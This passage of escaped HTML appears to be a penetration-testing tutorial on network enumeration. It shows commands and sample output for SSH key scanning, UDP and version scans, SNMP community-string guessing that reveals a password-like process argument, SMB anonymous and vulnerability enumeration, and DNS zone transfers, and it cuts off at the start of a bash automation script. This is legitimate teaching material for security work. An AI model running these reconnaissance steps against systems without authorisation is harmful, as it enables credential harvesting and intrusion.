class=\"o\"\u003e===============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2024/01/30 10:10:15 \u003cspan class=\"nv\"\u003eFinished\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e===============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"ssh-enumeration\"\u003eSSH Enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SSH version detection and key enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ ssh -V\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eOpenSSH_8.2p1 Ubuntu-4ubuntu0.5, OpenSSL 1.1.1f \u003cspan class=\"m\"\u003e31\u003c/span\u003e Mar \u003cspan class=\"m\"\u003e2020\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ ssh-keyscan -t rsa,dsa,ecdsa,ed25519 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 192.168.1.10:22 SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e192.168.1.10 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e192.168.1.10 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"advanced-techniques\"\u003eAdvanced Techniques\u003c/h2\u003e\n\u003ch3 id=\"udp-port-scanning\"\u003eUDP Port Scanning\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# UDP port scan for common services\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ nmap -sU --top-ports \u003cspan class=\"m\"\u003e1000\u003c/span\u003e 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.94 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2024-01-30 10:15 UTC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.023s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE         SERVICE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/udp   open          domain\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e123/udp  open          ntp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e161/udp  open          snmp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e500/udp  open\u003cspan class=\"p\"\u003e|\u003c/span\u003efiltered isakmp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: \u003cspan class=\"m\"\u003e1\u003c/span\u003e IP address \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e host up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned in 45.67 seconds\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"snmp-enumeration\"\u003eSNMP Enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SNMP community string enumeration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eScanning \u003cspan class=\"m\"\u003e1\u003c/span\u003e hosts, \u003cspan class=\"m\"\u003e122\u003c/span\u003e communities\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e192.168.1.10 \u003cspan class=\"o\"\u003e[\u003c/span\u003epublic\u003cspan class=\"o\"\u003e]\u003c/span\u003e Linux router 4.15.0-99-generic \u003cspan class=\"c1\"\u003e#100-Ubuntu SMP \\\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Wed Apr \u003cspan class=\"m\"\u003e22\u003c/span\u003e 20:32:56 UTC \u003cspan class=\"m\"\u003e2020\u003c/span\u003e x86_64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e192.168.1.10 \u003cspan class=\"o\"\u003e[\u003c/span\u003einternal\u003cspan class=\"o\"\u003e]\u003c/span\u003e Linux router 4.15.0-99-generic \u003cspan class=\"c1\"\u003e#100-Ubuntu SMP \\\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Wed Apr \u003cspan class=\"m\"\u003e22\u003c/span\u003e 20:32:56 UTC \u003cspan class=\"m\"\u003e2020\u003c/span\u003e x86_64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SNMP walk with valid community string\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ snmpwalk -v2c -c public 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiso.3.6.1.2.1.1.1.0 \u003cspan class=\"o\"\u003e=\u003c/span\u003e STRING: \u003cspan class=\"s2\"\u003e\u0026#34;Linux router 4.15.0-99-generic\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiso.3.6.1.2.1.1.2.0 \u003cspan class=\"o\"\u003e=\u003c/span\u003e OID: iso.3.6.1.4.1.8072.3.2.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiso.3.6.1.2.1.1.3.0 \u003cspan class=\"o\"\u003e=\u003c/span\u003e Timeticks: \u003cspan class=\"o\"\u003e(\u003c/span\u003e123456\u003cspan class=\"o\"\u003e)\u003c/span\u003e 0:20:34.56\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Extract running processes (potential password exposure)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ snmpwalk -v2c -c internal 192.168.1.10 1.3.6.1.2.1.25.4.2.1.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiso.3.6.1.2.1.25.4.2.1.2.1 \u003cspan class=\"o\"\u003e=\u003c/span\u003e STRING: \u003cspan class=\"s2\"\u003e\u0026#34;kernel\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiso.3.6.1.2.1.25.4.2.1.2.123 \u003cspan class=\"o\"\u003e=\u003c/span\u003e STRING: \u003cspan class=\"s2\"\u003e\u0026#34;/usr/local/bin/login.py kj23sadkj123as0-d213\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# System information\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ snmpget -v2c -c public 192.168.1.10 1.3.6.1.2.1.1.5.0  \u003cspan class=\"c1\"\u003e# Hostname\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiso.3.6.1.2.1.1.5.0 \u003cspan class=\"o\"\u003e=\u003c/span\u003e STRING: \u003cspan class=\"s2\"\u003e\u0026#34;router\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"service-version-detection\"\u003eService Version Detection\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Detailed service version detection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ nmap -sV -sC -p 80,443,22,21,25,53,110,143,993,995 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.94 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2024-01-30 10:20 UTC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.023s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e21/tcp   open  ftp     vsftpd 3.0.3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e25/tcp   open  smtp    Postfix smtpd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain  ISC BIND 9.16.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp   open  http    Apache httpd 2.4.41 \u003cspan class=\"o\"\u003e((\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e110/tcp  open  pop3    Dovecot pop3d\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e143/tcp  open  imap    Dovecot imapd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e443/tcp  open  https   Apache httpd 2.4.41 \u003cspan class=\"o\"\u003e((\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e993/tcp  open  imaps   Dovecot imapd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e995/tcp  open  pop3s   Dovecot pop3d\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: OS: Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:linux:linux_kernel\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"smbnetbios-enumeration\"\u003eSMB/NetBIOS Enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SMB enumeration with smbclient\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ smbclient -L //192.168.1.10 -N\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAnonymous login successful\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Sharename       Type      Comment\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ---------       ----      -------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print$          Disk      Printer Drivers\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    shared          Disk      Shared Files\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    IPC$            IPC       IPC Service \u003cspan class=\"o\"\u003e(\u003c/span\u003eSamba 4.13.17\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enumerate SMB shares\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ enum4linux -a 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting enum4linux v0.9.1 \u003cspan class=\"o\"\u003e(\u003c/span\u003e http://labs.portcullis.co.uk/application/enum4linux/ \u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Target Information\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Target ........... 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    RID Range ........ 500-550,1000-1050\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Username ......... \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Password ......... \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SMB version detection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ nmap --script smb-protocols 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT    STATE SERVICE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp open  microsoft-ds\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb-protocols: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   dialects: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     NT LM 0.12 \u003cspan class=\"o\"\u003e(\u003c/span\u003eSMBv1\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003edangerous, but default\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     2.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     3.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    3.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for SMB vulnerabilities\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ nmap --script smb-vuln* 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"dns-enumeration\"\u003eDNS Enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# DNS zone transfer attempt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ dig axfr @192.168.1.10 example.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.12 \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @192.168.1.10 example.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e server found\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e;;\u003c/span\u003e global options: +cmd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexample.com.        \u003cspan class=\"m\"\u003e3600\u003c/span\u003e    IN    SOA    ns1.example.com. admin.example.com. \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  \u003cspan class=\"m\"\u003e2024013001\u003c/span\u003e \u003cspan class=\"m\"\u003e3600\u003c/span\u003e \u003cspan class=\"m\"\u003e1800\u003c/span\u003e \u003cspan class=\"m\"\u003e604800\u003c/span\u003e \u003cspan class=\"m\"\u003e86400\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexample.com.        \u003cspan class=\"m\"\u003e3600\u003c/span\u003e    IN    NS     ns1.example.com.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewww.example.com.    \u003cspan class=\"m\"\u003e3600\u003c/span\u003e    IN    A      192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003email.example.com.   \u003cspan class=\"m\"\u003e3600\u003c/span\u003e    IN    A      192.168.1.11\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# DNS enumeration with dnsrecon\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ dnsrecon -d example.com -t axfr -n 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Testing NS Servers \u003cspan class=\"k\"\u003efor\u003c/span\u003e Zone Transfer\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Checking \u003cspan class=\"k\"\u003efor\u003c/span\u003e Zone Transfer \u003cspan class=\"k\"\u003efor\u003c/span\u003e example.com name servers\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Zone Transfer was successful!!\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e NS ns1.example.com 192.168.1.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"automation-scripts\"\u003eAutomation Scripts\u003c/h2\u003e\n\u003ch3 id=\"bash-enumeration-script\"\u003eBash Enumeration Script\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e# Network enumeration automation script\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eTARGET\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e -z \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$TARGET\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Usage: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$0\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u0026lt;target_ip\u0026gt;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Starting comprehensive enumeration of \u003c/span\u003e\u003cspan class=\"nv\"\u003e$TARGET\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;==============================================\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Host discovery\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;[+] Host discovery...\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap 